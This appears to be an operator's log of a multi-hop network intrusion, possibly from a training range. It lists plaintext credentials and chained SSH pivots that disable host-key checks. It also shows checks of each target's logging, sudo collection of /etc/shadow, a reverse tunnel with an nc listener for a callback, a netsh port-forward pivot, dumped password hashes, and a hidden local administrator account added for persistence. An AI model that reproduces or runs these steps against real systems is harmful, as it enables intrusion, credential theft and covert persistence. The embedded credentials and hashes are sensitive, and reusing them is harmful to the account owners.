@@ -1,0 +1,433 @@
+Date:2024-05-14 
+Start time: 0900
+End time: 1500
+
+------------------------
+SOM
+------------------------
+>T1: 10.50.33.94
+->T2: 10.20.169.122
+-->T3: 10.20.169.238
+---> T4: 192.168.169.43
+----< T5: 192.168.169.111
+-----> T6: 192.168.169.122
+----> T7: 192.168.169.113
+------------------------
+Creds
+------------------------
+engineer14::enshallah
+caisson14::tread_depth
+NOC_Admin14::5gftE8DCc8
+user14::P455w0rd
+=========================
+T1: >10.50.33.94
+=========================
+X-----------------------
+2024-05-14 09:02:05-- connection to T1; start vetting
+ssh -MS /tmp/T1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer14@10.50.33.94 -p 10123
+enshallah
+
+fa:16:3e:0e:4c:7b
+10.20.169.33
+2024-05-14 09:03:20-- date
+Tue May 14 13:03:15 UTC 2024
+Tue May 14 13:03:15 UTC 2024
+Linux ext-rtr 4.18.0-519.el8.x86_64 #1 SMP Tue Oct 24 16:44:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+
+-rw-rw-r--.  1 root   utmp     30720 May 14 13:04 wtmp
+-rw-rw-r--.  1 root   utmp    299300 May 14 13:04 lastlog
+-rw-------.  1 root   root    101063 May 14 13:04 messages
+-rw-------.  1 root   root    145960 May 14 13:04 secure
+/var/log/audit/audit.log
+*.* @@10.50.22.142:514
+2024-05-14 09:11:00-- vetting complete; redirecting to T2
+
+2024-05-14 13:41:48-- start exit vetting
+2024-05-14 13:42:49-- exit vetting complete; disconnect from T1
+
+Logged In: wtmp, utmp, lastlog, messages, secure, audit.log, rsyslog
+------------------------X
+=========================
+
+=========================
+T2: ->10.20.169.122
+=========================
+X-----------------------
+2024-05-14 09:12:28-- connection to T2; start vetting
+ssh -S /tmp/T1 -O forward -L 127.0.0.1:2002:10.20.169.122:52203 dummy
+ssh -MS /tmp/T2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson14@127.0.0.1 -p 2002
+tread_depth
+
+FA-16-3E-11-8A-8E
+10.20.169.122
+2024-05-14 09:13:57-- date
+Tue 05/14/2024
+01:13 PM
+2024-05-14 09:25:34-- vetting complete-clean box; redirecting to T3
+
+
+
+2024-05-14 13:39:07-- start exit vetting
+2024-05-14 13:41:24-- exit vetting complete; disconnect from T2
+
+Logged In: Security
+------------------------X
+=========================
+
+=========================
+T3:  -->10.20.169.238
+=========================
+X-----------------------
+2024-05-14 09:28:10-- connection to T3; start vetting
+ssh -S /tmp/T2 -O forward -L 127.0.0.1:2003:10.20.169.238:52230 dummy
+ssh -MS /tmp/T3 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin14@127.0.0.1 -p 2003
+5gftE8DCc8
+
+eth0:
+fa:16:3e:0e:b6:90
+10.20.169.238
+eth1:
+fa:16:3e:a1:9c:bc
+192.168.169.206
+2024-05-14 09:30:25-- date
+Tue May 14 13:30:23 UTC 2024
+Tue May 14 13:30:23 UTC 2024
+Linux Vyos1 3.13.11-1-amd64-vyos #1 SMP Wed Aug 12 02:08:05 UTC 2015 x86_64 GNU/Linux
+
+-rw-rw-r--  1 root     utmp         51072 May 14 13:33 wtmp
+-rw-rw-r--  1 root     utmp        299300 May 14 13:33 lastlog
+-rw-r-----  1 root     adm       14145694 May 14 13:34 auth.log
+
+2024-05-14 09:39:47-- vetting complete-all clear; redirecting to T4
+
+2024-05-14 13:36:13-- start exit vetting
+2024-05-14 13:38:36-- exit vetting complete; disconnect from T3
+
+Logged In: wtmp, utmp, lastlog, messages, auth.log
+------------------------X
+=========================
+
+=========================
+T4: --->192.168.169.43
+=========================
+X-----------------------
+2024-05-14 09:43:32--  connection to T4; start vetting
+ssh -S /tmp/T3 -O forward -L 127.0.0.1:2004:192.168.169.43:33125 dummy
+ssh -MS /tmp/T4 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user14@127.0.0.1 -p 2004
+P455w0rd
+
+eth0:
+fa:16:3e:ef:b1:9f
+10.123.169.5
+eth1:
+fa:16:3e:25:f6:b6
+192.168.169.43
+2024-05-14 09:46:05-- date
+Tue May 14 13:46:00 UTC 2024
+Tue May 14 13:46:00 UTC 2024
+Linux DESKTOP-ADMIN1 4.18.0-519.el8.x86_64 #1 SMP Tue Oct 24 16:44:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+
+-rw-rw-r--.  1 root   utmp      17664 May 14 13:40 wtmp
+-rw-rw-r--.  1 root   utmp     299300 May 14 13:40 lastlog
+-rw-------.  1 root   root     122789 May 14 13:42 messages
+-rw-------.  1 root   root   14817918 May 14 13:48 secure
+/var/log/audit/audit.log
+0 * * * * root    /bin/lynis audit system
+/firetools
+
+2024-05-14 10:05:36-- vetting complete; starting collection
+sudo /var/log/lynis.log
+57d9927642120523c6d2e70ff52c8d88 - remote 304K
+57d9927642120523c6d2e70ff52c8d88 - local 304K
+
+/etc/passwd
+3fbf38ef7add3e76e5b759cb2bdcabe1 - remote 4K
+3fbf38ef7add3e76e5b759cb2bdcabe1 - local 4K
+
+/etc/group
+845212e30cafb06f8d1ee40e49b5dd71 - remote 4K
+845212e30cafb06f8d1ee40e49b5dd71 - local 4K
+
+sudo /etc/shadow
+6f0ccb65ee196e548f3a9b8c74f0fb19 - remote 4K
+6f0ccb65ee196e548f3a9b8c74f0fb19 - local 4K
+
+2024-05-14 10:15:56-- collection complete
+2024-05-14 10:23:46-- catch callback
+
+2024-05-14 13:32:39-- start exit vetting
+2024-05-14 13:35:40-- exit vetting complete; disconnect from T4
+
+Logged In: wtmp, utmp, lastlog, messages, secure, audit.log, lynis.log, lynis-report.dat
+------------------------X
+=========================
+
+=========================
+T5: ----<192.168.169.111
+=========================
+X-----------------------
+2024-05-14 10:29:48-- connection to T5; start vetting
+ssh -S /tmp/T4 dummy -O forward -R 192.168.169.111:8014:0.0.0.0:2005
+nc -nvlp 2005
+
+FA-16-3E-89-4D-3A
+192.168.169.111
+2024-05-14 10:31:58-- date
+Tuesday, May 14, 2024 2:31:56 PM
+mstsc.exe                     5520 Console                    1     78,208 K Running         DESKTOP-USER11\Administrator                            0:00:16 Workstation17 - Remote Desktop Connection                               
+C:\windows\Explorer.EXE                                                                                           3508             892        
+C:\windows\system32\mstsc.exe                                                                                     7108             5520       
+  TCP    192.168.169.111:50185  192.168.169.12:3389    ESTABLISHED     5520
+
+2024-05-14 11:37:40-- vetting complete; netsh
+
+
+
+netsh interface portproxy show all
+netsh interface portproxy add v4tov4 listenport=60014 listenaddress=192.168.169.111 connectport=33521 connectaddress=192.168.169.122 protocol=tcp
+netsh interface portproxy show all
+2024-05-14 11:45:04-- netsh rule added; redirecting to T6
+
+2024-05-14 12:21:30-- remove netsh
+netsh interface portproxy delete v4tov4 listenport=60014 listenaddress=192.168.169.111
+2024-05-14 12:21:57-- netsh rule removed; start exit vetting
+2024-05-14 12:26:30-- exit vetting complete; disconnect from T5
+
+Logged In: Powershell, Security
+-----------------------X
+=========================
+
+=========================
+T6: ----->192.168.169.122
+=========================
+X-----------------------
+2024-05-14 11:53:41-- connection to T6; start vetting
+ssh -S /tmp/T4 dummy -O forward -L 60014:192.168.169.111:60014
+netstat -tunap
+ssh -MS /tmp/T6 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user14@127.0.0.1 -p 60014
+P455w0rd
+
+fa:16:3e:e2:bd:b8
+192.168.169.122
+2024-05-14 11:56:26-- date
+Tue May 14 15:56:24 UTC 2024
+Tue May 14 15:56:24 UTC 2024
+Linux DESKTOP-USER12 4.18.0-519.el8.x86_64 #1 SMP Tue Oct 24 16:44:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+
+-rw-rw-r--.  1 root   utmp     6144 May 14 15:53 wtmp
+-rw-rw-r--.  1 root   utmp   299300 May 14 15:53 lastlog
+-rw-------.  1 root   root    38225 May 14 15:56 messages
+-rw-------.  1 root   root    32099 May 14 15:58 secure
+/var/log/audit/audit.log
+2024-05-14 12:06:00-- vetting complete-clean box; start survey
+2024-05-14 12:14:52-- survey complete; start exit vetting
+
+passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
+systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
+tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
+polkitd:x:998:996:User for polkitd:/:/sbin/nologin
+unbound:x:997:994:Unbound DNS resolver:/etc/unbound:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+sssd:x:996:993:User for sssd:/:/sbin/nologin
+setroubleshoot:x:995:992::/var/lib/setroubleshoot:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+cockpit-ws:x:994:991:User for cockpit web service:/nonexisting:/sbin/nologin
+cockpit-wsinstance:x:993:990:User for cockpit-ws instances:/nonexisting:/sbin/nologin
+chrony:x:992:989::/var/lib/chrony:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+centos:x:1000:1000:Cloud User:/home/centos:/bin/bash
+user1:x:1001:10::/home/useraccounts/user1:/bin/bash
+user2:x:1002:10::/home/useraccounts/user2:/bin/bash
+user3:x:1003:10::/home/useraccounts/user3:/bin/bash
+user4:x:1004:10::/home/useraccounts/user4:/bin/bash
+user5:x:1005:10::/home/useraccounts/user5:/bin/bash
+user6:x:1006:10::/home/useraccounts/user6:/bin/bash
+user7:x:1007:10::/home/useraccounts/user7:/bin/bash
+user8:x:1008:10::/home/useraccounts/user8:/bin/bash
+user9:x:1009:10::/home/useraccounts/user9:/bin/bash
+user10:x:1010:10::/home/useraccounts/user10:/bin/bash
+user11:x:1011:10::/home/useraccounts/user11:/bin/bash
+user12:x:1012:10::/home/useraccounts/user12:/bin/bash
+user13:x:1013:10::/home/useraccounts/user13:/bin/bash
+user14:x:1014:10::/home/useraccounts/user14:/bin/bash
+user15:x:1015:10::/home/useraccounts/user15:/bin/bash
+user16:x:1016:10::/home/useraccounts/user16:/bin/bash
+user17:x:1017:10::/home/useraccounts/user17:/bin/bash
+user18:x:1018:10::/home/useraccounts/user18:/bin/bash
+user19:x:1019:10::/home/useraccounts/user19:/bin/bash
+user20:x:1020:10::/home/useraccounts/user20:/bin/bash
+user21:x:1021:10::/home/useraccounts/user21:/bin/bash
+user22:x:1022:10::/home/useraccounts/user22:/bin/bash
+user23:x:1023:10::/home/useraccounts/user23:/bin/bash
+radicle:x:1024:10::/home/useraccounts/radicle:/bin/bash
+
+shadow
+root:$6$ip9aq/njGE$rDPEKkFVrhmtXu0FFx.9AbgcHgnF9UbyGnqFi9NvOMKR7nyusGrfsqZpxV/O5yVffocySZNnBrc9WBj8zkuhG.:19852:0:99999:7:::
+bin:*:19326:0:99999:7:::
+daemon:*:19326:0:99999:7:::
+adm:*:19326:0:99999:7:::
+lp:*:19326:0:99999:7:::
+sync:*:19326:0:99999:7:::
+shutdown:*:19326:0:99999:7:::
+halt:*:19326:0:99999:7:::
+mail:*:19326:0:99999:7:::
+operator:*:19326:0:99999:7:::
+games:*:19326:0:99999:7:::
+ftp:*:19326:0:99999:7:::
+nobody:*:19326:0:99999:7:::
+dbus:!!:19660::::::
+systemd-coredump:!!:19660::::::
+systemd-resolve:!!:19660::::::
+tss:!!:19660::::::
+polkitd:!!:19660::::::
+unbound:!!:19660::::::
+rpc:!!:19660:0:99999:7:::
+sssd:!!:19660::::::
+setroubleshoot:!!:19660::::::
+rpcuser:!!:19660::::::
+cockpit-ws:!!:19660::::::
+cockpit-wsinstance:!!:19660::::::
+chrony:!!:19660::::::
+sshd:!!:19660::::::
+centos:!!:19852:0:99999:7:::
+user1:$1$OzCElc2L$LJnBD/zNxEq3BVMcx9.lb0:19852:0:99999:7:::
+user2:$1$7oQ5K1PZ$8hKQ69uB6nXTUuN.Z3gW0.:19852:0:99999:7:::
+user3:$1$r2JRY6Ze$.ToF39D6jwfusV610hCxr.:19852:0:99999:7:::
+user4:$1$9sLD9Bzm$bPIImuPwUJv8MBJ.RGRBh0:19852:0:99999:7:::
+user5:$1$GAjASwEQ$Q0LRyFQ75TBbpnewBPV0H0:19852:0:99999:7:::
+user6:$1$ZRoQdR1S$GxMv.Cm6SpibprLvVgUTK1:19852:0:99999:7:::
+user7:$1$nWRJTTOM$6/L.P4C78alEFvQEtBvtu.:19852:0:99999:7:::
+user8:$1$8pCyIeHB$ztrflVsZqhV2NPKKcsYa71:19852:0:99999:7:::
+user9:$1$pkKvIRFw$usz11le4wxtkovWf6eeSk0:19852:0:99999:7:::
+user10:$1$mhiNyQjY$OpuU/7waD4TrhpAfFrZss.:19852:0:99999:7:::
+user11:$1$XcWNcY7Q$kx6spTBI4UMVHQeS16XxO/:19852:0:99999:7:::
+user12:$1$ktqJngua$qpveLP7v4bJyEpaaToipf/:19852:0:99999:7:::
+user13:$1$L8hwba0T$PUZeMzIrI4.Nz7W59heoj1:19852:0:99999:7:::
+user14:$1$iTGOkgwY$BWO3BDeEnXEsiKg8HqWB50:19852:0:99999:7:::
+user15:$1$Rafart3s$VVFShn9p4d0MlzmREOGxb/:19852:0:99999:7:::
+user16:$1$4O.QRM44$t09Fe2RPA8x7IYqH.hT1J.:19852:0:99999:7:::
+user17:$1$jW.S4vNh$WG9FrPiTk/xb0DhXmvST41:19852:0:99999:7:::
+user18:$1$S30cM7Rd$lMl0zyTKJgUfRQ2KICYnr0:19852:0:99999:7:::
+user19:$1$lgANxUy9$u.mvQMyQck0aKgRUzm0o00:19852:0:99999:7:::
+user20:$1$QWJoi6vp$jiAFvuKOyh.Jkb6qAEbxO.:19852:0:99999:7:::
+user21:$1$dl6Fhz3w$CggJrWDvwZMvW0FbgNIBX.:19852:0:99999:7:::
+user22:$1$D0NGNqyv$mVdE/NQj7j2/euT2IvW7x/:19852:0:99999:7:::
+user23:$1$p5aiuFXu$66mkURIt5gxAn/5UD1l6V1:19852:0:99999:7:::
+radicle:$1$ZBitbgXW$DrAsPM0qUPVx6okSzOU/j0:19852:0:99999:7:::
+
+2024-05-14 12:19:14-- exit vetting complete; disconnect from T6
+
+
+Logged In: wtmp, utmp, lastlog, messages, secure, btmp, audit.log
+-----------------------X
+=========================
+4->7
+=========================
+T7: ---->192.168.169.113
+=========================
+X-----------------------
+2024-05-14 12:31:24-- connection to T7; start vetting
+ssh -S /tmp/T4 -O forward -L 127.0.0.1:2007:192.168.169.113:33521 dummy
+ssh -MS /tmp/T7 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user14@127.0.0.1 -p 2007
+P455w0rd
+
+FA-16-3E-AB-DF-3F
+192.168.169.113
+2024-05-14 12:32:56-- date
+Tue 05/14/2024                                                                                                                  
+04:32 PM   
+
+2024-05-14 12:57:48-- vetting complete-all clean; start survey
+Admin                    Administrator            cloudbase-init                                                                
+DefaultAccount           Guest                    sshd                                                                          
+user1                    user10                   user11                                                                        
+user12                   user13                   user14                                                                        
+user15                   user16                   user17                                                                        
+user18                   user19                   user2                                                                         
+user20                   user21                   user22                                                                        
+user23                   user3                    user36                                                                        
+user37                   user4                    user5                                                                         
+user6                    user7                    user8                                                                         
+user9                    WDAGUtilityAccount    
+*Access Control Assistance Operators                                                                                            
+*Administrators                                                                                                                 
+*Backup Operators                                                                                                               
+*Cryptographic Operators                                                                                                        
+*Device Owners                                                                                                                  
+*Distributed COM Users                                                                                                          
+*Event Log Readers                                                                                                              
+*Guests                                                                                                                         
+*Hyper-V Administrators                                                                                                         
+*IIS_IUSRS                                                                                                                      
+*Network Configuration Operators                                                                                                
+*Performance Log Users                                                                                                          
+*Performance Monitor Users                                                                                                      
+*Power Users                                                                                                                    
+*Remote Desktop Users                                                                                                           
+*Remote Management Users                                                                                                        
+*Replicator                                                                                                                     
+*System Managed Accounts Group                                                                                                  
+*Users 
+
+Alias name     Administrators                                                                                                   
+Comment        Administrators have complete and unrestricted access to the computer/domain                                      
+
+Members                                                                                                                         
+
+-------------------------------------------------------------------------------                                                 
+Admin                                                                                                                           
+Administrator                                                                                                                   
+cloudbase-init                                                                                                                  
+user1                                                                                                                           
+user10                                                                                                                          
+user11                                                                                                                          
+user12                                                                                                                          
+user13                                                                                                                          
+user14                                                                                                                          
+user15                                                                                                                          
+user16                                                                                                                          
+user17                                                                                                                          
+user18                                                                                                                          
+user19                                                                                                                          
+user2                                                                                                                           
+user20                                                                                                                          
+user21                                                                                                                          
+user22                                                                                                                          
+user23                                                                                                                          
+user3                                                                                                                           
+user36                                                                                                                          
+user37                                                                                                                          
+user4                                                                                                                           
+user5                                                                                                                           
+user6                                                                                                                           
+user7                                                                                                                           
+user8                                                                                                                           
+user9   
+
+2024-05-14 13:12:22-- survey complete
+
+net user user44 P455w0rd /add
+net localgroup Administrators user44 /add
+2024-05-14 13:21:54-- add user; add user to admin group
+
+2024-05-14 13:26:39-- start exit vetting
+2024-05-14 13:32:00-- exit vetting complete; disconnect from T7
+
+Logged In: Security, Application
+-----------------------X
+=========================
